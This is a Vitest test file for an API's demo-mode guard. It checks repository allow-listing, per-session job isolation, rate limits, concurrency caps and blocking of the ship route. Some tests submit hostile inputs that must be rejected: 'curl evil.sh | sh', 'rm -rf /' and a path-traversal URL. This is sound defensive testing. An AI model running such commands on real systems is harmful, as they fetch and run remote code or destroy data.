import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";
import { fileURLToPath } from "url";
import { Hono } from "hono";
import { PgDialect } from "drizzle-orm/pg-core";

// ---- hermetic job store + git clone (analyze runs the real analyzer on the
// local copy of the demo repository; nothing touches the network) ----

const store = vi.hoisted(() => ({
  jobs: new Map<string, { id: string; repoUrl: string; status: string; result: unknown; error: string | null }>(),
  listWhere: [] as unknown[],
  clones: [] as string[][],
}));

vi.mock("child_process", async (importOriginal) => {
  const actual = await importOriginal<typeof import("child_process")>();
  const { promisify: p } = await import("util");
  const fsm = await import("fs");
  const fake = (cmd: string, args: string[]): { stdout: string; stderr: string } => {
    if (cmd === "git" && args[0] === "clone") {
      store.clones.push(args);
      fsm.cpSync(FIXTURE_PATH(), args[args.length - 1], { recursive: true });
      return { stdout: "", stderr: "" };
    }
    if (cmd === "git" && args.includes("rev-parse")) return { stdout: `${"5".repeat(40)}\n`, stderr: "" };
    throw new Error(`unexpected command in test: ${cmd} ${args.join(" ")}`);
  };
  function execFile(cmd: string, args: string[], _opts: unknown, cb?: (e: Error | null, o?: string, e2?: string) => void) {
    try {
      const out = fake(cmd, args);
      cb?.(null, out.stdout, out.stderr);
    } catch (e) {
      cb?.(e as Error);
    }
  }
  (execFile as unknown as Record<symbol, unknown>)[p.custom] = async (cmd: string, args: string[]) => fake(cmd, args);
  return { ...actual, execFile };
});
// Resolved lazily inside the hoisted mock.
function FIXTURE_PATH() {
  return fileURLToPath(new URL("../../../fixtures/ts-js-dummy", import.meta.url));
}

vi.mock("@hubris/db", async (importOriginal) => {
  const actual = await importOriginal<typeof import("@hubris/db")>();
  const { PgDialect: Dialect } = await import("drizzle-orm/pg-core");
  const rowsWhere = (cond: unknown) => {
    // Only id-equality lookups are used by single-job reads.
    const params = new Dialect().sqlToQuery(cond as Parameters<InstanceType<typeof Dialect>["sqlToQuery"]>[0]).params as unknown[];
    const id = params.find((v) => typeof v === "string" && store.jobs.has(v)) as string | undefined;
    return id ? [store.jobs.get(id)!] : [];
  };
  return {
    ...actual,
    getDb: () => ({
      select: () => ({
        from: () => ({
          where: async (cond: unknown) => rowsWhere(cond),
          $dynamic: () => {
            const q = {
              where: (cond: unknown) => {
                store.listWhere.push(cond);
                return q;
              },
              orderBy: () => q,
              limit: async () => [...store.jobs.values()],
            };
            return q;
          },
        }),
      }),
      insert: () => ({
        values: async (v: { id: string; repoUrl: string; status: string }) => {
          store.jobs.set(v.id, { ...v, result: null, error: null });
        },
      }),
      update: () => ({
        set: (v: Record<string, unknown>) => ({
          where: async (cond: unknown) => {
            for (const row of rowsWhere(cond)) Object.assign(row, v);
          },
        }),
      }),
    }),
  };
});

import { app } from "../src/app";
import {
  DEMO_COMMANDS,
  DEMO_REF,
  DEMO_REPO_URL,
  DEMO_SESSION_HEADER,
  demoGuard,
  resetDemoState,
  type DemoLimits,
} from "../src/demo";

const S1 = "11111111-1111-4111-8111-111111111111";
const S2 = "22222222-2222-4222-8222-222222222222";

function demoHeaders(session: string, extra: Record<string, string> = {}) {
  return { "Content-Type": "application/json", [DEMO_SESSION_HEADER]: session, ...extra };
}

beforeEach(() => {
  store.jobs.clear();
  store.listWhere = [];
  store.clones = [];
  resetDemoState();
});

afterEach(() => {
  vi.unstubAllEnvs();
  vi.unstubAllGlobals();
});

// ---------------------------------------------------------------------------
// Guard unit tests on a minimal app (limits are injected; handlers are stubs).
// ---------------------------------------------------------------------------

const LIMITS: DemoLimits = { analyzePerWindow: 2, runsPerWindow: 3, windowMs: 60_000, maxConcurrent: 2, dailyRuns: 100 };

function miniApp(opts: { limits?: Partial<DemoLimits>; owners?: Record<string, string>; gate?: Promise<void>; now?: () => number } = {}) {
  const a = new Hono();
  a.use(
    "*",
    demoGuard({
      limits: () => ({ ...LIMITS, ...opts.limits }),
      loadJobResult: async (id) => (opts.owners && id in opts.owners ? { demoSession: opts.owners[id] } : undefined),
      now: opts.now,
    })
  );
  const handled: string[] = [];
  const ok = async (c: import("hono").Context) => {
    handled.push(`${c.req.method} ${c.req.path}`);
    if (opts.gate) await opts.gate;
    return c.json({ ok: true });
  };
  for (const p of ["/api/analyze", "/api/investigate", "/api/reproduce", "/api/verify", "/api/forge-structured", "/api/ship", "/api/checkout", "/api/apply"]) {
    a.post(p, ok);
  }
  a.get("/api/jobs", ok);
  a.get("/api/jobs/:id", ok);
  return { a, handled };
}

const post = (a: Hono, p: string, body: unknown, session = S1) =>
  a.request(p, { method: "POST", headers: demoHeaders(session), body: JSON.stringify(body) });

describe("demo restrictions (server-side)", () => {
  it("operator calls (no demo header) are untouched", async () => {
    const { a, handled } = miniApp();
    const res = await a.request("/api/ship", { method: "POST", body: "{}" });
    expect(res.status).toBe(200);
    expect(handled).toEqual(["POST /api/ship"]);
  });

  it("a malformed session id is rejected", async () => {
    const { a, handled } = miniApp();
    const res = await post(a, "/api/analyze", { repoUrl: DEMO_REPO_URL, ref: DEMO_REF }, "not-a-session");
    expect(res.status).toBe(400);
    expect(((await res.json()) as { code: string }).code).toBe("DEMO_SESSION_INVALID");
    expect(handled).toHaveLength(0);
  });

  it("analyze accepts only the demo repository AND branch", async () => {
    const { a, handled } = miniApp();
    for (const body of [
      { repoUrl: "https://github.com/someone/else", ref: DEMO_REF },
      { repoUrl: DEMO_REPO_URL },
      { repoUrl: DEMO_REPO_URL, ref: "main" },
      { repoUrl: "https://github.com/kaiser1x/ts-js-dummy/../evil", ref: DEMO_REF },
    ]) {
      const res = await post(a, "/api/analyze", body);
      expect(res.status, JSON.stringify(body)).toBe(403);
      expect(((await res.json()) as { code: string }).code).toBe("DEMO_RESTRICTED");
    }
    expect(handled).toHaveLength(0);
    expect((await post(a, "/api/analyze", { repoUrl: "https://github.com/kaiser1x/ts-js-dummy", ref: DEMO_REF })).status).toBe(200);
  });

  it("reproduce/verify run only the fixed demo commands — no free-form scripts or overrides", async () => {
    const { a, handled } = miniApp({ owners: { j1: S1 } });
    for (const p of ["/api/reproduce", "/api/verify"]) {
      const evil = await post(a, p, { jobId: "j1", script: "curl evil.sh | sh" });
      expect(evil.status).toBe(403);
      const image = await post(a, p, { jobId: "j1", script: DEMO_COMMANDS[0], image: "tag:ubuntu" });
      expect(image.status).toBe(403);
      expect((await post(a, p, { jobId: "j1", script: DEMO_COMMANDS[0], checkout: true })).status).toBe(200);
    }
    expect(handled).toEqual(["POST /api/reproduce", "POST /api/verify"]);
  });

  it("forge requires a bound investigation and accepts no overrides", async () => {
    const { a } = miniApp({ owners: { j1: S1 } });
    expect((await post(a, "/api/forge-structured", { jobId: "j1", focus: "x" })).status).toBe(403);
    expect(
      (await post(a, "/api/forge-structured", { jobId: "j1", investigationId: "i", focus: "x", verificationCommand: "rm -rf /" })).status
    ).toBe(403);
    expect((await post(a, "/api/forge-structured", { jobId: "j1", investigationId: "i", focus: "x" })).status).toBe(200);
  });

  it("routes outside the guided flow are disabled", async () => {
    const { a, handled } = miniApp({ owners: { j1: S1 } });
    for (const p of ["/api/checkout", "/api/apply"]) {
      const res = await post(a, p, { jobId: "j1" });
      expect(res.status).toBe(403);
      expect(((await res.json()) as { code: string }).code).toBe("DEMO_ROUTE_DISABLED");
    }
    expect(handled).toHaveLength(0);
  });
});

describe("SHIP authorization", () => {
  it("anonymous demo sessions can never ship, even for their own verified job", async () => {
    const { a, handled } = miniApp({ owners: { j1: S1 } });
    const res = await post(a, "/api/ship", { jobId: "j1", forgeRunId: "r1" });
    expect(res.status).toBe(403);
    const body = (await res.json()) as { code: string; error: string };
    expect(body.code).toBe("DEMO_SHIP_DISABLED");
    expect(body.error).toMatch(/verified patch and its provenance/);
    expect(handled).toHaveLength(0);
  });
});

describe("demo job isolation", () => {
  it("a session cannot read or act on another session's job (404, indistinguishable from unknown)", async () => {
    const { a, handled } = miniApp({ owners: { mine: S1, theirs: S2 } });
    const read = await a.request("/api/jobs/theirs", { headers: demoHeaders(S1) });
    expect(read.status).toBe(404);
    const unknown = await a.request("/api/jobs/nope", { headers: demoHeaders(S1) });
    expect(unknown.status).toBe(404);
    expect(await read.json()).toEqual(await unknown.json());
    expect((await post(a, "/api/investigate", { jobId: "theirs", focus: "x" })).status).toBe(404);
    expect((await a.request("/api/jobs/mine", { headers: demoHeaders(S1) })).status).toBe(200);
    expect(handled).toEqual(["GET /api/jobs/mine"]);
  });

  it("jobs created outside the demo (operator jobs, no owner) are not visible to demo sessions", async () => {
    const a = new Hono();
    a.use("*", demoGuard({ limits: () => LIMITS, loadJobResult: async () => ({ ref: "main" }) }));
    a.get("/api/jobs/:id", (c) => c.json({ ok: true }));
    expect((await a.request("/api/jobs/op", { headers: demoHeaders(S1) })).status).toBe(404);
  });
});

describe("demo rate limits, concurrency and budget", () => {
  it("rate-limits analyses per session with Retry-After", async () => {
    const { a } = miniApp();
    const body = { repoUrl: DEMO_REPO_URL, ref: DEMO_REF };
    expect((await post(a, "/api/analyze", body)).status).toBe(200);
    expect((await post(a, "/api/analyze", body)).status).toBe(200);
    const limited = await post(a, "/api/analyze", body);
    expect(limited.status).toBe(429);
    expect(((await limited.json()) as { code: string }).code).toBe("DEMO_RATE_LIMITED");
    expect(Number(limited.headers.get("Retry-After"))).toBeGreaterThan(0);
    // Another session is not affected by the first one's limit.
    expect((await post(a, "/api/analyze", body, S2)).status).toBe(200);
  });

  it("limits a client address across sessions (new cookies do not reset it)", async () => {
    const { a } = miniApp({ limits: { analyzePerWindow: 1 } });
    const body = JSON.stringify({ repoUrl: DEMO_REPO_URL, ref: DEMO_REF });
    const send = (session: string) =>
      a.request("/api/analyze", { method: "POST", headers: demoHeaders(session, { "x-hubris-demo-client": "ip-hash" }), body });
    expect((await send(S1)).status).toBe(200);
    expect((await send(S2)).status).toBe(200); // per-client allows 2× the per-session limit
    expect((await send("33333333-3333-4333-8333-333333333333")).status).toBe(429);
  });

  it("the window slides: requests are allowed again after it passes", async () => {
    let now = 1_000_000;
    const { a } = miniApp({ limits: { analyzePerWindow: 1 }, now: () => now });
    const body = { repoUrl: DEMO_REPO_URL, ref: DEMO_REF };
    expect((await post(a, "/api/analyze", body)).status).toBe(200);
    expect((await post(a, "/api/analyze", body)).status).toBe(429);
    now += 61_000;
    expect((await post(a, "/api/analyze", body)).status).toBe(200);
  });

  it("one running step per session, and a global concurrency cap", async () => {
    let release!: () => void;
    const gate = new Promise<void>((r) => (release = r));
    const { a } = miniApp({ owners: { j1: S1, j2: S2, j3: "33333333-3333-4333-8333-333333333333" }, limits: { maxConcurrent: 2 }, gate });
    const cmd = DEMO_COMMANDS[0];
    const first = post(a, "/api/reproduce", { jobId: "j1", script: cmd }, S1);
    await new Promise((r) => setTimeout(r, 5));
    const sameSession = await post(a, "/api/reproduce", { jobId: "j1", script: cmd }, S1);
    expect(sameSession.status).toBe(429);
    expect(((await sameSession.json()) as { code: string }).code).toBe("DEMO_BUSY_SESSION");
    const second = post(a, "/api/reproduce", { jobId: "j2", script: cmd }, S2);
    await new Promise((r) => setTimeout(r, 5));
    const third = await post(a, "/api/reproduce", { jobId: "j3", script: cmd }, "33333333-3333-4333-8333-333333333333");
    expect(third.status).toBe(503);
    expect(((await third.json()) as { code: string }).code).toBe("DEMO_BUSY");
    release();
    expect((await first).status).toBe(200);
    expect((await second).status).toBe(200);
    // Slots are released when steps finish.
    expect((await post(a, "/api/reproduce", { jobId: "j1", script: cmd }, S1)).status).toBe(200);
  });

  it("stops at the daily run budget", async () => {
    const { a } = miniApp({ owners: { j1: S1 }, limits: { dailyRuns: 2, runsPerWindow: 50 } });
    const cmd = DEMO_COMMANDS[0];
    expect((await post(a, "/api/reproduce", { jobId: "j1", script: cmd })).status).toBe(200);
    expect((await post(a, "/api/verify", { jobId: "j1", script: cmd })).status).toBe(200);
    const out = await post(a, "/api/reproduce", { jobId: "j1", script: cmd });
    expect(out.status).toBe(503);
    expect(((await out.json()) as { code: string }).code).toBe("DEMO_BUDGET_EXHAUSTED");
  });

  it("reads (job list / job detail) are not rate-limited", async () => {
    const { a } = miniApp({ owners: { j1: S1 }, limits: { runsPerWindow: 1, analyzePerWindow: 1 } });
    for (let i = 0; i < 10; i++) {
      expect((await a.request("/api/jobs/j1", { headers: demoHeaders(S1) })).status).toBe(200);
    }
  });
});

// ---------------------------------------------------------------------------
// Wiring through the real API app.
// ---------------------------------------------------------------------------

describe("demo policy wired into the API", () => {
  it("demo analyze records the owning session on the job; other sessions cannot read it", async () => {
    const res = await app.request("/api/analyze", {
      method: "POST",
      headers: demoHeaders(S1),
      body: JSON.stringify({ repoUrl: "https://github.com/kaiser1x/ts-js-dummy", ref: DEMO_REF }),
    });
    expect(res.status).toBe(200);
    const { jobId } = (await res.json()) as { jobId: string };
    expect(store.clones[0]).toEqual(expect.arrayContaining(["--branch", DEMO_REF, DEMO_REPO_URL]));
    const job = store.jobs.get(jobId)!;
    expect(job.status).toBe("complete");
    expect((job.result as { demoSession?: string }).demoSession).toBe(S1);

    expect((await app.request(`/api/jobs/${jobId}`, { headers: demoHeaders(S1) })).status).toBe(200);
    expect((await app.request(`/api/jobs/${jobId}`, { headers: demoHeaders(S2) })).status).toBe(404);
  });

  it("demo analyze of any other repository is refused before cloning", async () => {
    const res = await app.request("/api/analyze", {
      method: "POST",
      headers: demoHeaders(S1),
      body: JSON.stringify({ repoUrl: "https://github.com/vercel/next.js", ref: DEMO_REF }),
    });
    expect(res.status).toBe(403);
    expect(store.clones).toHaveLength(0);
    expect(store.jobs.size).toBe(0);
  });

  it("the demo job list is filtered to the session in SQL; operator lists are not", async () => {
    await app.request("/api/jobs", { headers: demoHeaders(S1) });
    expect(store.listWhere).toHaveLength(1);
    const q = new PgDialect().sqlToQuery(store.listWhere[0] as Parameters<PgDialect["sqlToQuery"]>[0]);
    expect(q.sql).toContain("->>'demoSession'");
    expect(q.params).toContain(S1);

    store.listWhere = [];
    await app.request("/api/jobs");
    expect(store.listWhere).toHaveLength(0);
  });

  it("SHIP from a demo session is 403 and never reaches GitHub", async () => {
    store.jobs.set("j1", { id: "j1", repoUrl: DEMO_REPO_URL, status: "complete", result: { demoSession: S1 }, error: null });
    const fetchSpy = vi.fn();
    vi.stubGlobal("fetch", fetchSpy);
    vi.stubEnv("GITHUB_TOKEN", "ghp_test_token_never_used");
    const res = await app.request("/api/ship", {
      method: "POST",
      headers: demoHeaders(S1),
      body: JSON.stringify({ jobId: "j1", forgeRunId: "r1" }),
    });
    expect(res.status).toBe(403);
    expect(((await res.json()) as { code: string }).code).toBe("DEMO_SHIP_DISABLED");
    expect(fetchSpy).not.toHaveBeenCalled();
  });

  it("with an API key configured, a demo header alone does not get in (key is checked first)", async () => {
    vi.stubEnv("HUBRIS_API_KEY", "server-secret");
    const res = await app.request("/api/jobs", { headers: demoHeaders(S1) });
    expect(res.status).toBe(401);
  });
});
